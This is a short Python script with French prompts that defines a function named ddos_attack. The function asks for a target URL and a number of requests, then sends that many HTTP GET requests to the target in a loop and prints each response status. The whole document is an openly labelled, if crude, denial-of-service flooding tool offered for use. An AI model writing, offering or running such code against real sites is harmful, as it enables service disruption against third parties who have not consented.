import requests

def ddos_attack():
    url = input("Entrez l'URL à attaquer : ")
    requete = int(input("Combien de requêtes envoyer ? "))
    for _ in range(requete):
        try:
            response = requests.get(url)
            print(f"Requête envoyée. Statut : {response.status_code}")
        except Exception as e:
            print(f"Erreur lors de l'envoi de la requête : {e}")
